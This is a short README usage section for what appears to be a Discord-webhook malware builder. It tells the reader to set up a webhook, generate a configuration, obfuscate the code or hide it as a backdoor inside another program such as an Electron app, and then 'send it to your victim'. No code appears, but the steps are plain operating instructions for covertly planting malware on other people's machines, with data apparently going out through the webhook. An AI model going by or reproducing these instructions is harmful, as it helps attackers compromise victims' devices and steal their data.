# How to use

1. Create a webhook in your discord server (I recommend to do this on a private server)
2. Install all of the required modules using: `npm install`
3. Run the CLI using `npm run cli` and fill out the questions respectively to create the configuration file
4. Here you can choose to obfuscate this code or implement it as a backdoor in a different program (For example: an electron application)
5. Enjoy! (Just don't forget to send it to your victim)

# Extra Information
